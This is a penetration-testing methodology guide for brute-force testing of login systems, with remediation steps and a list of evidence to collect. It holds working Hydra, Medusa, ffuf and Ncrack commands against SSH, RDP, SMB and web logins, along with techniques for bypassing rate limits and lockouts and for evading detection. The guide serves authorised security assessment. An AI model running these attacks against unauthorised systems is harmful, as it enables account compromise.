# Brute Force Attack Testing

## Overview
Brute force attack testing evaluates the resilience of authentication mechanisms against systematic credential guessing. This covers online brute force attacks against live services, rate limiting bypass techniques, account lockout policy testing, and distributed attack methodologies. Testing identifies weaknesses in login defenses that could allow attackers to compromise accounts through automated credential guessing.

## Classification
- **CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts), CWE-521 (Weak Password Requirements), CWE-799 (Improper Control of Interaction Frequency)
- **OWASP:** A07:2021 - Identification and Authentication Failures
- **CVSS Base:** 5.3 - 7.5 (Medium to High)
- **MITRE ATT&CK:** T1110.001 (Brute Force: Password Guessing)

## Detection Methodology

### 1. Authentication Endpoint Discovery
Identify all authentication endpoints:
```
- Web login forms (/login, /signin, /auth, /api/login)
- API authentication endpoints (OAuth, JWT token endpoints)
- SSH, RDP, FTP, SMTP, POP3, IMAP services
- VPN portals (Cisco, Fortinet, Pulse Secure)
- Admin panels (/admin, /wp-admin, /administrator)
- Basic/Digest HTTP authentication
- Custom application login flows
- Multi-step authentication (username page → password page)
```

### 2. Rate Limiting Assessment
Test for rate limiting on authentication endpoints:
```
1. Send 5 rapid login attempts → observe response
2. Send 10 rapid attempts → check for blocking, CAPTCHA, or delays
3. Send 50 rapid attempts → check for IP ban or account lockout
4. Record exact threshold (attempts before lockout, cooldown duration)
5. Check if rate limiting is per-IP, per-account, per-session, or global
6. Verify rate limits apply to both valid and invalid usernames
```

### 3. Rate Limiting Bypass Techniques
```
IP rotation:
- X-Forwarded-For: 127.0.0.1 (header spoofing)
- X-Real-IP, X-Originating-IP, X-Client-IP, True-Client-IP
- X-Forwarded-For: <random_IP> (per-request rotation)
- Proxy chains / rotating proxies / Tor

Account-level bypasses:
- Alternate username formats (user@domain.com vs user vs DOMAIN\user)
- Case variation in username
- Add spaces or null bytes to username
- Unicode normalization tricks (e.g., Cyrillic lookalikes)

Request-level bypasses:
- Change User-Agent per request
- Add/remove parameters (extra POST fields)
- Switch between POST body formats (form-data, JSON, URL-encoded)
- Use different API endpoints that share the same auth backend
- Alternate between HTTP/1.1 and HTTP/2
- Modify request path (/login vs /Login vs /LOGIN vs /login/)
```

### 4. Account Lockout Policy Testing
```
Test systematically:
1. Make N failed attempts with a valid username → does lockout occur?
2. Record the lockout threshold (typically 3-10 attempts)
3. Measure lockout duration (temporary vs permanent vs progressive)
4. Test if lockout resets after successful login
5. Check if lockout applies only to the password field (can still enumerate users)
6. Verify lockout notification is sent to the account owner
7. Test if admin accounts have different lockout policies

Lockout bypass:
- Account lockout with no CAPTCHA → automate at just-under-threshold rate
- Progressive delays → adjust attack speed accordingly
- Lockout by IP only → rotate IPs
- Lockout by account only → password spraying (one password, many accounts)
```

### 5. Response Analysis for Username Enumeration
```
Compare responses for valid vs invalid usernames:
- Different error messages ("Invalid username" vs "Invalid password")
- Different HTTP status codes
- Response time differences (timing side-channel)
- Different response lengths
- Presence/absence of specific form fields or tokens
- Account lockout only for valid usernames
```

## Tool Usage

### Hydra
```bash
# HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP Basic Auth
hydra -l admin -P passwords.txt target.com http-get /admin/

# SSH
hydra -l root -P passwords.txt target.com ssh

# FTP
hydra -L users.txt -P passwords.txt target.com ftp

# RDP
hydra -l administrator -P passwords.txt target.com rdp

# SMB
hydra -l admin -P passwords.txt target.com smb

# SMTP
hydra -l user@target.com -P passwords.txt smtp://target.com

# MySQL
hydra -l root -P passwords.txt target.com mysql

# Rate limiting (-t threads, -w wait)
hydra -l admin -P passwords.txt -t 4 -w 5 target.com ssh

# Resume interrupted session
hydra -R
```

### Medusa
```bash
# SSH brute force
medusa -h target.com -u admin -P passwords.txt -M ssh

# Multiple hosts
medusa -H hosts.txt -U users.txt -P passwords.txt -M ssh

# FTP
medusa -h target.com -U users.txt -P passwords.txt -M ftp

# HTTP form
medusa -h target.com -u admin -P passwords.txt -M web-form \
  -m FORM:"login.php" -m DENY:"Invalid" \
  -m FORM-DATA:"post?username=&password="

# Rate control
medusa -h target.com -u admin -P passwords.txt -M ssh -t 2 -T 3
```

### Burp Suite Intruder
```
1. Capture login request in Proxy
2. Send to Intruder (Ctrl+I)
3. Set attack positions (highlight password field)
4. Select attack type:
   - Sniper: one payload set, one position at a time
   - Battering ram: same payload in all positions
   - Pitchfork: synchronized multiple payload sets
   - Cluster bomb: all combinations of multiple payload sets
5. Load payload list (passwords, usernames)
6. Configure resource pool (throttling, max concurrent requests)
7. Add Grep-Match rules to identify successful logins
8. Monitor response length/status code for anomalies
```

### ffuf
```bash
# HTTP POST brute force
ffuf -u http://target.com/login -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=FUZZ" \
  -w /usr/share/wordlists/rockyou.txt \
  -fc 401 -mc 200,302

# HTTP Basic Auth
ffuf -u http://target.com/admin -w passwords.txt:FUZZ \
  -H "Authorization: Basic $(echo -n admin:FUZZ | base64)"

# With rate limiting
ffuf -u http://target.com/login -X POST \
  -d "user=admin&pass=FUZZ" -w passwords.txt \
  -rate 10 -fc 403

# Filter by response size (exclude failed login page size)
ffuf -u http://target.com/login -X POST \
  -d "user=admin&pass=FUZZ" -w passwords.txt \
  -fs 4521
```

### Ncrack
```bash
# SSH
ncrack -p 22 --user admin -P passwords.txt target.com

# RDP
ncrack -p 3389 --user administrator -P passwords.txt target.com

# Multiple services
ncrack -p ssh:22,rdp:3389 --user admin -P passwords.txt target.com
```

### Distributed Attack Considerations
```
Techniques for distributed brute force:
- Split wordlists across multiple attacking machines
- Use cloud instances in different regions for IP diversity
- Coordinate timing to stay below per-IP rate limits
- Use residential proxy pools to mimic legitimate traffic patterns
- Employ credential stuffing frameworks (e.g., SentryMBA, OpenBullet)
  Note: document for defensive awareness; test only in scope

Detection evasion:
- Randomize timing between requests (jitter)
- Mimic legitimate User-Agent strings
- Maintain valid session cookies
- Follow redirects and handle CSRF tokens properly
- Randomize request order (don't try alphabetically)
```

## Remediation
1. **Implement account lockout** -- lock after 5-10 failed attempts, with progressive backoff
2. **Deploy rate limiting** -- per-IP and per-account, on all authentication endpoints
3. **Use CAPTCHA** -- after 3-5 failures, with increasing difficulty
4. **Require multi-factor authentication** -- TOTP, FIDO2/WebAuthn, SMS (last resort)
5. **Enforce strong password policies** -- minimum 12 characters, check against breach lists
6. **Normalize authentication responses** -- identical messages for invalid user and invalid password
7. **Implement constant-time comparison** -- prevent timing-based enumeration
8. **Monitor and alert** -- detect brute force patterns in real-time (SIEM integration)
9. **Use Web Application Firewalls** -- detect and block automated attack patterns
10. **Implement login delays** -- progressive delays after failed attempts (1s, 2s, 4s, 8s...)

## Evidence Collection
When documenting brute force findings:
- Authentication endpoint URL and method (POST/GET, form fields)
- Rate limiting threshold discovered (or absence thereof)
- Account lockout policy details (threshold, duration, reset mechanism)
- Bypass techniques that succeeded (header spoofing, request format changes)
- Username enumeration vectors identified
- Any credentials successfully brute-forced (redact in report, share securely)
- Tool output logs with timestamps
- Response differences used to identify success vs failure
- Recommendations mapped to specific defensive gaps
